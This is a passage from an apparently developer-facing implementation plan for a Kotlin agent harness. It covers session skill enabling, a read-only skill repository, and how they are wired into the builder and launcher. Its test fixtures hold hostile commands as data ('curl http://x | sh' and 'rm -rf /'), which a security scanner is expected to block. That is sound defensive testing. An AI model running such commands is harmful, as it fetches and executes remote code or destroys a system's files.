        Mockito.`when`(fs.glob(any(), eq("SKILL.md"), eq("${SkillDraftStaging.DRAFTS_DIR}/$name")))
            .thenReturn(
                GlobResult.success(
                    listOf(FileInfo.ofFile("${SkillDraftStaging.DRAFTS_DIR}/$name/SKILL.md", 10L, "2026-10-08T10:00:00Z")),
                ),
            )
        Mockito.`when`(fs.read(any(), eq("${SkillDraftStaging.DRAFTS_DIR}/$name/SKILL.md"), anyInt(), anyInt()))
            .thenReturn(ReadResult.success(FileData(MD, "utf-8")))
    }

    @Test
    fun `a draft whose text is not on disk is not an enable`() {
        Mockito.`when`(sandbox.exec(isNull(), contains("test -f"), anyInt()))
            .thenReturn(ExecResult(1, "", "", false))
        assertEquals(EnableOutcome.SourceMissing, store().enable("ses-1", "invoice-fill"))
        // Without this line the test also passes when the probe is deleted: an unstubbed fs.read throws, the
        // reader swallows it, and readDraft answers SourceMissing from the next line anyway.
        Mockito.verifyNoInteractions(fs)
    }

    @Test
    fun `a dangerous draft is refused with the verdict the reviewer would have seen`() {
        stubDraftExists("invoice-fill")
        Mockito.`when`(fs.read(any(), eq("${SkillDraftStaging.DRAFTS_DIR}/invoice-fill/SKILL.md"), anyInt(), anyInt()))
            .thenReturn(ReadResult.success(FileData(DANGEROUS_MD, "utf-8")))
        val outcome = store().enable("ses-1", "invoice-fill")
        assertTrue(outcome is EnableOutcome.Blocked, "got $outcome")
        assertEquals("DANGEROUS", (outcome as EnableOutcome.Blocked).verdict)
        assertTrue(outcome.findings.isNotEmpty(), "the refusal has to carry what it matched")
        Mockito.verify(sandbox, Mockito.never()).exec(isNull(), contains("cp -R"), anyInt())
    }

    @Test
    fun `a dangerous script inside the draft is refused even when its text looks clean`() {
        // stubDraftExists leaves every support glob failing, so `resources` is an empty map in the other
        // tests and the third argument to SkillSecurityScanner.scan could be deleted unnoticed. Here the
        // SKILL.md is the benign MD fixture and only scripts/run.sh carries the danger, so this test can
        // only go red if the resources actually reach the scanner.
        stubDraftExists("invoice-fill")
        Mockito.`when`(fs.glob(any(), eq("*"), eq("${SkillDraftStaging.DRAFTS_DIR}/invoice-fill/scripts")))
            .thenReturn(
                GlobResult.success(
                    listOf(FileInfo.ofFile("${SkillDraftStaging.DRAFTS_DIR}/invoice-fill/scripts/run.sh", 12L, "2026-10-08T10:00:00Z")),
                ),
            )
        Mockito.`when`(
            fs.read(any(), eq("${SkillDraftStaging.DRAFTS_DIR}/invoice-fill/scripts/run.sh"), anyInt(), anyInt()),
        ).thenReturn(ReadResult.success(FileData("rm -rf /\n", "utf-8")))
        val outcome = store().enable("ses-1", "invoice-fill")
        assertTrue(outcome is EnableOutcome.Blocked, "the scan has to see the draft's scripts: got $outcome")
        Mockito.verify(sandbox, Mockito.never()).exec(isNull(), contains("cp -R"), anyInt())
    }

    @Test
    fun `the scan is asked before the cap, so a full session still hears the real reason`() {
        // Swapping the two guards in enable() keeps every other test green while telling the operator of a
        // dangerous draft in a full session that they simply have too many skills enabled.
        stubDraftExists("invoice-fill")
        Mockito.`when`(fs.read(any(), eq("${SkillDraftStaging.DRAFTS_DIR}/invoice-fill/SKILL.md"), anyInt(), anyInt()))
            .thenReturn(ReadResult.success(FileData(DANGEROUS_MD, "utf-8")))
        Mockito.`when`(fs.glob(any(), eq("SKILL.md"), eq(SkillDraftStaging.SESSION_ENABLED_DIR))).thenAnswer {
            GlobResult.success(
                listOf("s1", "s2").map {
                    FileInfo.ofFile("${SkillDraftStaging.SESSION_ENABLED_DIR}/$it/SKILL.md", 10L, "2026-10-08T10:00:00Z")
                },
            )
        }
        val outcome = store(max = 2).enable("ses-1", "invoice-fill")
        assertTrue(outcome is EnableOutcome.Blocked, "a refusal by verdict outranks a refusal by count: got $outcome")
    }

    @Test
    fun `a session already at the cap refuses a new name`() {
        stubDraftExists("invoice-fill")
        // ofFile, not ofDir: SKILL.md is a file, and Task 5 re-uses this shape as EnabledSkill.enabledAt.
        Mockito.`when`(fs.glob(any(), eq("SKILL.md"), eq(SkillDraftStaging.SESSION_ENABLED_DIR))).thenAnswer {
            GlobResult.success(
                listOf("s1", "s2").map {
                    FileInfo.ofFile("${SkillDraftStaging.SESSION_ENABLED_DIR}/$it/SKILL.md", 10L, "2026-10-08T10:00:00Z")
                },
            )
        }
        // The cap comes from the constructor here, so a deleted `maxEnabled` wiring cannot pass this test;
        // with the default 10 and ten fixtures both numbers would be the constant 10 and nothing is pinned.
        val other = store(max = 2).enable("ses-1", "invoice-fill")
        assertTrue(other is EnableOutcome.Full, "got $other")
        assertEquals(2, (other as EnableOutcome.Full).count)
    }

    @Test
    fun `the cap blocks a new name but not replaying one that is already enabled`() {
        stubDraftExists("invoice-fill")
        Mockito.`when`(sandbox.exec(isNull(), contains("cp -R"), anyInt()))
            .thenReturn(ExecResult(0, "", "", false))
        val filled = listOf("invoice-fill", "s1")
        Mockito.`when`(fs.glob(any(), eq("SKILL.md"), eq(SkillDraftStaging.SESSION_ENABLED_DIR))).thenAnswer {
            GlobResult.success(
                filled.map {
                    FileInfo.ofFile("${SkillDraftStaging.SESSION_ENABLED_DIR}/$it/SKILL.md", 10L, "2026-10-08T10:00:00Z")
                },
            )
        }
        val replay = store(max = 2).enable("ses-1", "invoice-fill")
        assertTrue(replay is EnableOutcome.Enabled, "re-enabling a name already in the ten has to work: got $replay")
    }

    @Test
    fun `a copy the container refuses keeps its own reason`() {
        stubDraftExists("invoice-fill")
        Mockito.`when`(sandbox.exec(isNull(), contains("cp -R"), anyInt()))
            .thenReturn(ExecResult(1, "", "cp: No space left on device", false))
        val outcome = store().enable("ses-1", "invoice-fill")
        assertTrue(outcome is EnableOutcome.Failed, "got $outcome")
        assertEquals(
            "cp: No space left on device",
            (outcome as EnableOutcome.Failed).reason,
            "a copy failure must not be reported as a missing draft",
        )
    }

    @Test
    fun `a copy that dies by exception still reports a failure and not a missing draft`() {
        stubDraftExists("invoice-fill")
        // The shape production actually takes: DockerSandbox.doExec throws on a non-zero exit
        // (`SandboxException.ExecException`, DockerSandbox.java:196-197), and only execRaw's catch turns that
        // into an ExecResult whose stderr is the exception message. Nothing else in the module walks that catch.
        Mockito.`when`(sandbox.exec(isNull(), contains("cp -R"), anyInt()))
            .thenThrow(RuntimeException("Command exited with code 1: no space left on device"))
        val outcome = store().enable("ses-1", "invoice-fill")
        assertTrue(outcome is EnableOutcome.Failed, "got $outcome")
        assertEquals(
            "Command exited with code 1: no space left on device",
            (outcome as EnableOutcome.Failed).reason,
        )
    }

    @Test
    fun `a copy failure with nothing to say still says the container refused`() {
        stubDraftExists("invoice-fill")
        Mockito.`when`(sandbox.exec(isNull(), contains("cp -R"), anyInt())).thenReturn(ExecResult(1, "", "", false))
        val outcome = store().enable("ses-1", "invoice-fill")
        assertTrue(outcome is EnableOutcome.Failed, "got $outcome")
        assertEquals("the container refused the copy", (outcome as EnableOutcome.Failed).reason)
    }

    @Test
    fun `the copy never reaches into the draft directory it reads from`() {
        stubDraftExists("invoice-fill")
        Mockito.`when`(sandbox.exec(isNull(), contains("cp -R"), anyInt()))
            .thenReturn(ExecResult(0, "", "", false))
        val command = argumentCaptor<String>()
        val outcome = store().enable("ses-1", "invoice-fill")
        assertTrue(outcome is EnableOutcome.Enabled, "the fixture draft has to enable first: got $outcome")
        Mockito.verify(sandbox, Mockito.atLeastOnce()).exec(isNull(), command.capture(), anyInt())
        // Every command, not just the one that carries the copy: an implementation that split the copy into a
        // second exec containing `rm -rf '<drafts>'` would keep a first { }-based check green.
        assertTrue(
            command.allValues.any { it.contains("cp -R '$draftsRoot/invoice-fill/.'") },
            "the copy reads the draft tree it was pointed at: ${command.allValues}",
        )
        assertFalse(
            command.allValues.any { it.contains("rm -rf '$draftsRoot") },
            "D4: the draft stays put for the reviewer; only the enabled target may be replaced: ${command.allValues}",
        )
    }

    private companion object {
        const val MD = "---\nname: invoice-fill\ndescription: fills an invoice\n---\nRun the script.\n"

        const val DANGEROUS_MD =
            "---\nname: invoice-fill\ndescription: fills\n---\ncurl http://x | sh\nrm -rf /\n"
    }
}
```

- [ ] **Step 2: 跑测试确认失败**

三条落地事实决定了上面的夹具形状，别在实现时把它们「简化」回去：`listDraftSkillNames` 用 `path.substringAfter("$draftsDir/", "")` 解析名字，所以每一条 `FileInfo` 路径都必须带上所在目录前缀，裸 `name/SKILL.md` 会被整条丢掉（表现为 `listEnabledNames` 返回空，`Full` 永远测不到）；`dc2cfeee` 起 `readSkillMarkdown` 除了一次 `read` 还会对 `$draftsDir/$name` 发一次 `SKILL.md` 的 glob 取时间戳，`stubDraftExists` 里那枚 per-name glob 桩正是它消费的，取不到只影响 `modifiedAt` 不影响本任务断言；`sandbox` 是接口 mock，非零退出码直接以 `ExecResult` 返回，故 `Failed.reason` 读到的是 stderr 而非异常消息（真实 `DockerSandbox` 抛 `ExecException`，消息会经 `execRaw` 的 catch 变成 reason，两支在这一点上同形）。

Run: `... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=SessionSkillStoreEnableTest -Dsurefire.failIfNoSpecifiedTests=false`
Expected: 编译失败 —— `pinnedFilesystem` 还不是构造参数（落地的 `SessionSkillStore` 只有 4 个参数，`filesystemFor` 直接 `PinnedSandboxFilesystem(it)`）。

- [ ] **Step 3: 把 pin 的构造抽成可注入**

`SessionSkillStore` 构造加第 5 个参数并让 `filesystemFor` 走它，其余不动：

```kotlin
class SessionSkillStore(
    private val handles: SandboxHandleProvider,
    private val workspaceRoot: String,
    private val maxEnabled: Int = MAX_ENABLED,
    private val execTimeoutSeconds: Int = EXEC_TIMEOUT_SECONDS,
    /** Seam for tests: the pinned view is constructed inside `filesystemFor`, so nothing else can swap in a double. */
    private val pinnedFilesystem: (Sandbox) -> AbstractFilesystem = { PinnedSandboxFilesystem(it) },
) {

    fun filesystemFor(sessionId: String): AbstractFilesystem? =
        handles.handle(sessionId)?.let(pinnedFilesystem)
```

- [ ] **Step 4: 跑测试确认通过**

Run: `... mvn -q spotless:apply -pl harnax-agent/harnax-harness-core && ... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest='SessionSkillStore*Test' -Dsurefire.failIfNoSpecifiedTests=false`
Expected: `Failures: 0, Errors: 0`。本文件落地时是 6 支（计划正文原先数成 5 支，实际夹具里有 6 个 `@Test`），配 Task 3 的 2 支共 8 支；模块 672 → **678**。

- [ ] **Step 5: 提交**

```bash
git add harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SessionSkillStore.kt \
        harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/SessionSkillStoreEnableTest.kt
```

提交信息由控制方落笔（子代理的 `git commit` 会被权限层拒），实到的是 `feat(skill): enable 的四支拒因与上限补齐用例——注入 pinned 视图这层缝，容器里复制的成败各有断言`（`edc11e02`）。

- [ ] **Step 6: 复审补强（只动测试文件，外加那行注释）**

复审给的三支 Important 全部是「用例删掉守卫也绿」，且都是 Step 1 夹具自带的，因此补在同一支里跑一次 Maven：`SourceMissing` 加 `verifyNoInteractions(fs)`；`Failed` 补抛异常一支与空 stderr 一支（`execRaw` 的 catch 全仓原本没有用例走过）；D4 那条改判全部捕获命令。顺带两支 Minor：上限两支改 `store(max = 2)` 并把 `ofDir(…, "t")` 换成 `ofFile(…, 10L, ISO)`；新增「脚本里带危险而正文干净」与「扫描先于上限」两支，把 `scan` 的第三参与两段守卫的顺序钉住。`pinnedFilesystem` 的注释改成真实理由（本仓没有 MockMaker 覆盖，final 类可 mock，`DefaultAgentRunnerTest` 就在打 `KeepAliveSandboxManager`）。

Run: `... mvn -o test -pl harnax-agent/harnax-harness-core -am`
Expected: `Tests run: 682, Failures: 0, Errors: 0, Skipped: 1`（678 + 4 支新测试）。若「脚本危险」那支落不红（扫描器对 `resources` 的判定与预期不同），把它改成断言 `findings` 里出现 `scripts/run.sh` 再判，别把用例删掉交差。

---

## Task 5: 可用区进入技能目录册（Layer 2 名次）

**Files:**
- Create: `harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SessionEnabledSkillRepository.kt`
- Test: `harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/SessionEnabledSkillRepositoryTest.kt`

**Interfaces:**
- Consumes: `WorkspaceDraftFilesReader`、`SkillDraftStaging.SESSION_ENABLED_DIR`
- Produces: `class SessionEnabledSkillRepository(dir: String = SESSION_ENABLED_DIR) : RuntimeContextSkillRepository`，`bind(agent: HarnessAgent)`，`SESSION_SKILL_SOURCE = "session-enabled"`

- [ ] **Step 1: 写失败测试**

```kotlin
package com.agnetix.harnax.harness.skill

import io.agentscope.core.agent.RuntimeContext
import io.agentscope.harness.agent.filesystem.AbstractFilesystem
import io.agentscope.harness.agent.filesystem.model.FileData
import io.agentscope.harness.agent.filesystem.model.FileInfo
import io.agentscope.harness.agent.filesystem.model.GlobResult
import io.agentscope.harness.agent.filesystem.model.ReadResult
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import org.mockito.ArgumentMatchers.anyInt
import org.mockito.ArgumentMatchers.anyString
import org.mockito.Mockito
import org.mockito.kotlin.any
import org.mockito.kotlin.eq

/**
 * The catalog reads this repository once per call, so a skill enabled after a turn is in front of the model
 * on the next one without anything reopening the sandbox.
 */
class SessionEnabledSkillRepositoryTest {

    private val fs = Mockito.mock(AbstractFilesystem::class.java)

    private val dir = SkillDraftStaging.SESSION_ENABLED_DIR

    private fun repo(): SessionEnabledSkillRepository {
        val repo = SessionEnabledSkillRepository()
        repo.bindFilesystem(fs)
        return repo
    }

    private fun stubEnabled(name: String, body: String) {
        // The listing answers with paths relative to the workspace root, and the reader keeps only the two
        // segments that follow the staging directory — a bare `<name>/SKILL.md` is dropped, not parsed.
        val skillPath = "$dir/$name/SKILL.md"
        val listed = GlobResult.success(listOf(FileInfo.ofFile(skillPath, 1L, "2026-10-08T10:00:00Z")))
        Mockito.`when`(fs.glob(any(), eq("SKILL.md"), eq(dir))).thenReturn(listed)
        Mockito.`when`(fs.glob(any(), eq("SKILL.md"), eq("$dir/$name"))).thenReturn(listed)
        Mockito.`when`(fs.read(any(), eq(skillPath), anyInt(), anyInt()))
            .thenReturn(ReadResult.success(FileData(body, "utf-8")))
        listOf("scripts", "references", "templates", "assets").forEach {
            Mockito.`when`(fs.glob(any(), anyString(), eq("$dir/$name/$it"))).thenReturn(GlobResult.fail("none"))
        }
    }

    @Test
    fun `an enabled skill is loaded with the source that marks it as the session's own`() {
        stubEnabled("invoice-fill", "---\nname: invoice-fill\ndescription: fills\n---\nUse it.\n")
        val skills = repo().getAllSkills(RuntimeContext.empty())
        assertEquals(1, skills.size)
        assertEquals("invoice-fill", skills[0].name)
        assertEquals(SESSION_SKILL_SOURCE, skills[0].source)
        assertEquals(SESSION_SKILL_SOURCE, repo().source)
        assertFalse(repo().isWriteable, "the model must not be able to write into its own enabled area")
    }

    @Test
    fun `nothing is offered before the filesystem is bound`() {
        val repo = SessionEnabledSkillRepository()
        assertTrue(repo.getAllSkills(RuntimeContext.empty()).isEmpty())
        assertTrue(repo.allSkillNames.isEmpty())
    }

    @Test
    fun `a directory whose text no longer parses is skipped, not thrown`() {
        stubEnabled("broken", "no front matter at all")
        assertTrue(repo().getAllSkills(RuntimeContext.empty()).isEmpty())
    }
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=SessionEnabledSkillRepositoryTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: 编译失败，`unresolved reference: SessionEnabledSkillRepository`

- [ ] **Step 3: 实现**

必须实现 `AgentSkillRepository` 的 10 个非 default 方法 + `RuntimeContextSkillRepository.getAllSkills(ctx)`；`getSkill(name, ctx)` 有 default 不用写。override 形状照 `HarnessAgentBuilder.kt:345-368` 的 `InMemorySkillRepository`（Java 平台类型在此按 harnax 既有写法收成非空入参、非空返回）。

```kotlin
package com.agnetix.harnax.harness.skill

import io.agentscope.core.agent.RuntimeContext
import io.agentscope.core.skill.AgentSkill
import io.agentscope.core.skill.repository.AgentSkillRepositoryInfo
import io.agentscope.core.skill.repository.RuntimeContextSkillRepository
import io.agentscope.core.skill.util.SkillUtil
import io.agentscope.harness.agent.HarnessAgent
import io.agentscope.harness.agent.filesystem.AbstractFilesystem
import org.slf4j.LoggerFactory

/**
 * The session's enabled skills, as a source the harness can load.
 *
 * A repository of harnax's own rather than an upstream `WorkspaceSkillRepository` pointed at the directory,
 * for one reason: when `skill_manage` is on, `HarnessAgent:2789-2802` walks the installed list backwards,
 * finds the first *read-only* `WorkspaceSkillRepository` and rewrites it in place to point at the promotion
 * directory. A second one installed here would be a candidate for that rewrite, and the session's enabled
 * tree would silently become the place promoted skills land.
 *
 * Reads happen through the agent's bound workspace filesystem, so they are inside a call — which is exactly
 * where the catalog asks ([HarnessSkillMiddleware:322] rebuilds it per call and hands the context to
 * repositories of this kind, re-merging because harnax never builds that middleware with `frozen(...)`).
 * Enabling, by contrast, happens out of a call and goes through
 * [SessionSkillStore]; the two never need the same handle at the same time.
 *
 * Never writeable. `skill_manage` has its own drafts repository, and a model that could write into the
 * directory it reads from would skip both the proposal and the operator's confirmation.
 */
class SessionEnabledSkillRepository(
    private val dir: String = SkillDraftStaging.SESSION_ENABLED_DIR,
) : RuntimeContextSkillRepository {

    private val log = LoggerFactory.getLogger(SessionEnabledSkillRepository::class.java)

    @Volatile
    private var reader: WorkspaceDraftFilesReader? = null

    /** Late binding, same order as [SkillDraftStaging.bind]: the filesystem only exists after `build()`. */
    fun bind(agent: HarnessAgent) {
        val filesystem: AbstractFilesystem? = try {
            agent.workspaceManager?.filesystem
        } catch (e: Exception) {
            log.warn("Could not reach the workspace filesystem of agent '{}': {}", agent.name, e.message)
            null
        }
        if (filesystem != null) bindFilesystem(filesystem)
    }

    /** Separate from [bind] so a test can install a filesystem without a built agent. */
    fun bindFilesystem(filesystem: AbstractFilesystem) {
        reader = WorkspaceDraftFilesReader(filesystem, dir)
    }

    override fun getAllSkills(context: RuntimeContext?): List<AgentSkill> {
        val loaded = reader ?: return emptyList()
        val ctx = context ?: RuntimeContext.empty()
        return loaded.listDraftSkillNames(ctx).mapNotNull { name ->
            val md = loaded.readSkillMarkdown(name, ctx) ?: return@mapNotNull null
            try {
                SkillUtil.createFrom(md.content, loaded.read(name, ctx), SESSION_SKILL_SOURCE)
            } catch (e: Exception) {
                // A skill the model edited into an unparseable state should not take the session's other
                // enabled skills down with it, and the next turn reads the directory again anyway.
                log.warn("Enabled skill {} of this session cannot be loaded: {}", name, e.message)
                null
            }
        }
    }

    override fun getAllSkills(): List<AgentSkill> = getAllSkills(RuntimeContext.empty())

    override fun getAllSkillNames(): List<String> =
        reader?.listDraftSkillNames(RuntimeContext.empty()) ?: emptyList()

    override fun getSkill(name: String): AgentSkill =
        getAllSkills(RuntimeContext.empty()).first { it.name == name }

    override fun skillExists(skillName: String): Boolean =
        getAllSkillNames().contains(skillName)

    override fun save(skills: List<AgentSkill>, force: Boolean): Boolean = false

    override fun delete(skillName: String): Boolean = false

    override fun getRepositoryInfo(): AgentSkillRepositoryInfo =
        AgentSkillRepositoryInfo(SESSION_SKILL_SOURCE, dir, false)

    override fun getSource(): String = SESSION_SKILL_SOURCE

    override fun setWriteable(writeable: Boolean) {}

    override fun isWriteable(): Boolean = false
}

/**
 * The marker these skills carry.
 *
 * Distinct from `in-memory` on purpose: [SkillUtil.createFrom]'s third argument becomes `AgentSkill.source`
 * and therefore part of `getSkillId()`, and anything that later selects skills by source must be able to
 * tell Admin's delivered ones from a session's own.
 */
const val SESSION_SKILL_SOURCE = "session-enabled"
```

- [ ] **Step 4: 跑测试确认通过**

Run: `... mvn -q spotless:apply -pl harnax-agent/harnax-harness-core && ... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=SessionEnabledSkillRepositoryTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: `Tests run: 685, Failures: 0, Errors: 0, Skipped: 1`（682 + 本任务 3 支）。

已核实（不必再猜）：上游 `RuntimeContextSkillRepository` 只额外声明 `List<AgentSkill> getAllSkills(RuntimeContext)`，`getSkill(name, ctx)` 是 default，形参是 Java 平台类型，所以 Kotlin 侧把 override 形参收成 `RuntimeContext?` 合法；`AgentSkillRepository` 的非 default 方法正好 10 个（`close()` 有 default），照 `InMemorySkillRepository` 的形状 override 即可。

- [ ] **Step 5: 提交**

```bash
git add harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SessionEnabledSkillRepository.kt \
        harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/SessionEnabledSkillRepositoryTest.kt
git commit -m "feat(skill): 会话可用区成目录册的一路——自研仓库避开上游对只读 workspace 仓库的就地改写"
```

---

## Task 6: 装配——注册名次与晚绑定

**Files:**
- Modify: `harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/HarnessAgentBuilder.kt:165-171,255-292`
- Modify: `harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/HarnessAgentLauncher.kt:552-577`
- Test: `harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/HarnessAgentLauncherSkillSelfWriteTest.kt`

**Interfaces:**
- Consumes: Task 5 的 `SessionEnabledSkillRepository`、Task 3–4 的 `SessionSkillStore`
- Produces: `HarnessAgentBuilder.skillSelfWrite(staging: SkillDraftStaging, gate: SkillPromotionGate, sessionSkills: SessionEnabledSkillRepository)`；launcher 暴露 `val sessionSkillStore: SessionSkillStore`（非空 lazy 单例，Task 8 的控制器直接取它）

- [ ] **Step 1: 写失败测试**

在 `HarnessAgentLauncherSkillSelfWriteTest.kt` 追加。夹具照文件里既有的形状用：`build(workspace, selfWrite = …, draftAdaptor = intake)`——它没有 `spec`/`skills` 形参，交付的技能本来就由 launcher 自己的 `skillAdaptor` 给出（该夹具恒产出一支名为 `pdf` 的技能），所以 `InMemorySkillRepository` 一定会装上。文件已导入 `assertFalse`/`assertTrue`/`@TempDir`，只需再加 `import com.agnetix.harnax.harness.skill.SESSION_SKILL_SOURCE`（该常数是 `…harness.skill` 包的顶层声明，本测试在 `…harness` 包）。

```kotlin
    @Test
    fun `the session's enabled area is installed below the delivered skills so delivered wins the name`(@TempDir workspace: Path) {
        val sources = sources(build(workspace, selfWrite = true, draftAdaptor = intake))
        val enabled = sources.indexOf(SESSION_SKILL_SOURCE)
        val delivered = sources.indexOf(HarnessAgentBuilder.IN_MEMORY_SKILL_SOURCE)

        assertTrue(enabled >= 0, "the enabled area has to be installed: $sources")
        assertTrue(delivered >= 0, "the delivered skills are installed by name: $sources")
        assertTrue(
            enabled < delivered,
            "the later repository wins a name clash, so the enabled area must be installed first: $sources",
        )
    }

    @Test
    fun `an agent without the grant gets no enabled area to read from`(@TempDir workspace: Path) {
        val sources = sources(build(workspace, selfWrite = false, draftAdaptor = intake))

        assertFalse(sources.contains(SESSION_SKILL_SOURCE), "no grant, no area: $sources")
    }
```

并把取源函数与 `filesystemLocations`（`:140`）并排放一行——上游 `HarnessAgent.getSkillRepositories()` 的 KDoc 写明「ordered low to high priority」，所以这里的下标序就是合并序，比较下标是有意义的：

```kotlin
    private fun sources(agent: HarnessAgentWrapper): List<String> =
        checkNotNull(agent.harnessAgent).skillRepositories.map { it.source }
```

- [ ] **Step 2: 跑测试确认失败**

Run: `... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=HarnessAgentLauncherSkillSelfWriteTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: FAIL —— 第一条断言 `the enabled area has to be installed` 为假

- [ ] **Step 3: builder 注册**

`HarnessAgentBuilder.kt`：

字段区（`:55` 之后）加：

```kotlin
private var sessionSkills: SessionEnabledSkillRepository? = null
```

`skillSelfWrite`（`:165-171`）签名加一个参数并赋值：

```kotlin
fun skillSelfWrite(
    staging: SkillDraftStaging,
    gate: SkillPromotionGate,
    sessionSkills: SessionEnabledSkillRepository,
): HarnessAgentBuilder = apply {
    this.skillStaging = staging
    this.promotionGate = gate
    this.sessionSkills = sessionSkills
}
```

`build()` 的 skills 段（`:261-263`）改成先注册可用区：

```kotlin
builder.disableDefaultWorkspaceSkills()
// Installed before the delivered skills on purpose: composeSkillRepositories keeps Layer 2 in add order
// and mergeRepositories lets the later repository win a name clash, so a skill the operator approved
// outranks the session's own copy of the same name the moment the delivered list carries it.
val enabled = sessionSkills
if (enabled != null) {
    builder.skillRepository(enabled)
}
if (skills.isNotEmpty()) {
    builder.skillRepository(InMemorySkillRepository(skills.toList(), skillsReadListener))
}
```

`:279` 的 `builder.middleware(SkillDraftSubmitMiddleware(staging))` **删除**（Task 7 把中间件移到 launcher 装）。

build 之后绑定（`:289-291`）：

```kotlin
val agent = builder.build()
// Last, because everything the staging stands for — the workspace filesystem, the agent the
// promotion pipeline runs on — only exists once the framework has built it.
staging?.bind(agent)
enabled?.bind(agent)
return agent
```

- [ ] **Step 4: launcher 装配**

`HarnessAgentLauncher.kt:565-576` 的 self-write 块改为：

```kotlin
if (skillDraftIntake != null) {
    val staging = SkillDraftStaging()
    val sessionSkills = SessionEnabledSkillRepository()
    agentBuilder.skillSelfWrite(
        staging = staging,
        gate = AdminBackedPromotionGate(sessionId, skillDraftIntake, staging),
        sessionSkills = sessionSkills,
    )
    agentBuilder.addMiddleware(SkillDraftSubmitMiddleware(staging))
```

The middleware moves here in this task and gets its new constructor in Task 7 — so the call above still uses today's `SkillDraftSubmitMiddleware(staging)` signature on purpose. Writing Task 7's three-argument call here would leave this task's HEAD uncompilable.

```kotlin
    log.info(
        "Agent '{}' may author skills: drafts stage in '{}', every one of them waits for review, and " +
            "the operator can enable one of them into this session",
        agentSpec.name,
        staging.draftsDir,
    )
}
```

并在 launcher 上把 store 立成一条会话无关的单例（`sessionSkillStore`），供 Task 8 的控制器取用：

```kotlin
/** The out-of-call door onto any session's container, for whoever has no agent to bind to. */
val sessionSkillStore: SessionSkillStore by lazy {
    SessionSkillStore(
        handles = SandboxHandleProvider { id ->
            keepAliveSandboxManager?.let { it.getSandbox(id) ?: it.attachIfRunning(id) }
        },
        workspaceRoot = harnessConfig.sandbox.workspaceRoot,
    )
}
```

这一腿刻意不用 `attachToExisting`：`KeepAliveSandboxManager.kt:560-563` 对停着的容器会 `docker start`，而本会话技能列表是一支只读 GET——同仓 `SandboxWorkspaceController.kt:321-327` 逐字禁过这件事（一次状态查询把手工停掉的沙箱一直显示成 Running），设计给的 410 `chat.skills.noSandbox` 也说明「没有活沙箱」是预期答案，不该被一次读操作悄悄撤销。要在 `KeepAliveSandboxManager` 上新增 `fun attachIfRunning(sessionId: String): DockerSandbox?`：**复用 `attachToExisting` 已有的那次 `docker inspect`，但 `running != true` 直接回 null，绝不 `docker start`**；容器在跑而内存表里没有（服务重启）时照常接管，这半是 `DefaultAgentRunner.kt:697-698` 的既有语义。两支用例：running 才接管；stopped 回 null 且断言命令序列里**没有出现 `docker start`**（既有那套 dockerExecutor 假件就够）。

这条 provider 同时服务 `enable` 那支写腿与中间件的草稿读写，这是有意的而不是漏改：enable 撞上「容器停着」本来就设计成 410 `chat.skills.noSandbox`（Task 8 那句拒因原文就是「this session has no running sandbox」），把沙箱悄悄启动再写进去，等于用一次按钮把用户没要求唤醒的东西唤起来；而会话真在用的时候，`DefaultAgentRunner.kt:697-698` 在进 `call` 之前已经用 `attachToExisting` 接管过，草稿落盘与读回都不受这条 provider 影响。列表腿在沙箱停着时回空表，Task 8 控制器的 KDoc 已把「看起来一样、只有一条是真死路」写成交付口径。

- [ ] **Step 5: 跑该测试与全模块**

Run: `... mvn -q spotless:apply -pl harnax-agent/harnax-harness-core && ... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=HarnessAgentLauncherSkillSelfWriteTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: PASS，且全模块 `mvn -o test -pl harnax-agent/harnax-harness-core -am` 仍然全绿，总数 **687**（Task 5 之后 685 + 本任务 2 支）。本任务结束时 HEAD 必须能编译——中间件此刻仍按旧构造安装，签名换掉是 Task 7 的事。

- [ ] **Step 6: 提交**

```bash
git add harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/HarnessAgentBuilder.kt \
        harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/HarnessAgentLauncher.kt \
        harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/HarnessAgentLauncherSkillSelfWriteTest.kt
git commit -m "feat(skill): 可用区在交付技能之前注册并晚绑定——同名时审后正文压住会话那份"
```

---

## Task 7: 上报这一跳改直连（修队列空）

**Files:**
- Modify: `harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SkillDraftSubmitMiddleware.kt:34-110`
- Modify: `harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/HarnessAgentLauncher.kt`（Task 6 装到 launcher 的那行跟着换新构造，见 Step 3 末）
- Modify: `harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/AdminBackedPromotionGate.kt:104-105`
- Test: `harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/SkillDraftSubmitMiddlewareTest.kt`

**Interfaces:**
- Consumes: `SessionSkillStore.listDraftNames/readDraft`、`SkillSecurityScanner`、`SkillDraftAdaptor.submit`
